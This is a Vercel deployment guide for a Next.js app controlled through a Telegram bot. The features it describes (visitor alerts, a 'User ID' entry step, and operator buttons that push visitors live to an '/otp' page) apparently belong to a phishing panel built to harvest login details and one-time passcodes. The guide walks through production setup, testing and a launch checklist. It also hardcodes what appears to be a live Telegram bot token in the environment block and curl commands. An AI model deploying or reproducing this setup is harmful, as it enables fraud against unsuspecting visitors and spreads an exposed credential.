# Vercel Production Setup Guide

Complete guide to deploy and configure your project on Vercel for production.

## Prerequisites

- Vercel account (sign up at https://vercel.com)
- GitHub repository with your code
- Telegram bot token (from @BotFather)
- Your Telegram Chat ID (from @userinfobot)

## Step 1: Deploy to Vercel

1. Go to [Vercel Dashboard](https://vercel.com/dashboard)
2. Click **"Add New Project"**
3. Import your GitHub repository
4. Vercel will auto-detect Next.js settings
5. Click **"Deploy"**

Your project will be deployed and you'll get a URL like: `https://your-project.vercel.app`

## Step 2: Set Up Vercel KV (Optional but Recommended)

Vercel KV provides persistent storage for activities and approvals. Without it, data is stored in memory (lost on server restart).

### Option A: Set Up Vercel KV

1. In Vercel Dashboard, go to your project
2. Click **"Storage"** tab
3. Click **"Create Database"**
4. Select **"KV"** (Key-Value)
5. Choose a name and region
6. Click **"Create"**

Vercel will automatically set these environment variables:
- `KV_REST_API_URL`
- `KV_REST_API_TOKEN`

**Note:** These are set automatically - you don't need to add them manually!

### Option B: Skip KV (Use Memory Store)

If you skip KV setup, the app will use in-memory storage. This works but:
- Data is lost when serverless functions restart
- Not suitable for high-traffic production
- Fine for testing or low-traffic sites

## Step 3: Configure Environment Variables

In Vercel Dashboard → Your Project → **Settings** → **Environment Variables**, add:

### Required Variables

```env
TELEGRAM_BOT_TOKEN=8294919908:AAG4kUSp_DV0mg9l9hQmAVNzOJ5a-TL-2Lw
TELEGRAM_CHAT_ID=your_chat_id_here
```

**How to get Chat ID:**
1. Open Telegram
2. Search for **@userinfobot**
3. Start a chat - it shows your Chat ID (a number like `123456789`)

### Optional Variables

```env
NEXT_PUBLIC_APP_URL=https://your-project.vercel.app
```

**Note:** If not set, the app auto-detects the URL from request headers.

### KV Variables (Auto-Set)

If you set up Vercel KV, these are automatically added:
- `KV_REST_API_URL` ✅ (auto-set)
- `KV_REST_API_TOKEN` ✅ (auto-set)

## Step 4: Set Up Telegram Webhook

After deployment, set your Telegram webhook to point to your production URL:

```bash
curl -X POST "https://api.telegram.org/bot8294919908:AAG4kUSp_DV0mg9l9hQmAVNzOJ5a-TL-2Lw/setWebhook?url=https://your-project.vercel.app/api/telegram/webhook"
```

Replace `your-project.vercel.app` with your actual Vercel domain.

### Verify Webhook

Check if webhook is set correctly:

```bash
curl "https://api.telegram.org/bot8294919908:AAG4kUSp_DV0mg9l9hQmAVNzOJ5a-TL-2Lw/getWebhookInfo"
```

You should see your Vercel URL in the response.

## Step 5: Test Production Deployment

### Test 1: Check Environment Variables

Visit: `https://your-project.vercel.app/api/telegram/test`

Should show:
- ✅ Bot token configured
- ✅ Chat ID configured
- ✅ Test message sent successfully

### Test 2: Test Visitor Notification

1. Visit your production site: `https://your-project.vercel.app`
2. Check Telegram - you should receive a notification with buttons
3. Click a button (e.g., "OTP PAGE")
4. User should redirect instantly

### Test 3: Test User ID Flow

1. Visit production site
2. Enter a User ID and click Continue
3. Check Telegram - you should receive notification
4. Click "OTP PAGE" button
5. User should redirect to `/otp` page

## Step 6: Production Checklist

- [ ] Project deployed to Vercel
- [ ] Vercel KV set up (optional but recommended)
- [ ] `TELEGRAM_BOT_TOKEN` environment variable set
- [ ] `TELEGRAM_CHAT_ID` environment variable set
- [ ] Telegram webhook configured to production URL
- [ ] Test endpoint works: `/api/telegram/test`
- [ ] Visitor notifications work
- [ ] Redirect buttons work
- [ ] No console errors in production

## Troubleshooting

### Issue: "KV_REST_API_URL not found" errors

**Solution:** This is normal if you haven't set up Vercel KV. The app will use memory storage. To fix:
1. Set up Vercel KV (Step 2 above)
2. Or ignore the warnings - memory storage works fine

### Issue: Telegram notifications not working

**Check:**
1. Environment variables are set in Vercel Dashboard
2. Variables are set for **Production** environment (not just Preview)
3. You've redeployed after adding variables
4. Webhook is set correctly

### Issue: Redirects not working

**Check:**
1. Browser console shows: `[index.js] Redirect SSE connected`
2. Server logs show redirect commands being received
3. Visitor ID matches between Telegram message and browser

### Issue: Environment variables not working

**Solution:**
1. Make sure variables are set for **Production** environment
2. Redeploy after adding variables (Vercel → Deployments → Redeploy)
3. Check variable names are exact (case-sensitive)

## Environment Variables Summary

| Variable | Required | Auto-Set | Description |
|----------|----------|----------|-------------|
| `TELEGRAM_BOT_TOKEN` | ✅ Yes | ❌ No | Your Telegram bot token |
| `TELEGRAM_CHAT_ID` | ✅ Yes | ❌ No | Your Telegram chat ID |
| `NEXT_PUBLIC_APP_URL` | ⚠️ Optional | ❌ No | Your production URL (auto-detected if not set) |
| `KV_REST_API_URL` | ⚠️ Optional | ✅ Yes | Set automatically when KV is linked |
| `KV_REST_API_TOKEN` | ⚠️ Optional | ✅ Yes | Set automatically when KV is linked |

## Production URLs

After deployment, your URLs will be:
- **Production:** `https://your-project.vercel.app`
- **Preview:** `https://your-project-git-branch.vercel.app` (for each branch)

Set webhook to production URL for stable operation.

## Support

If you encounter issues:
1. Check Vercel deployment logs
2. Check browser console (F12)
3. Test endpoints: `/api/telegram/test`
4. Verify environment variables are set correctly

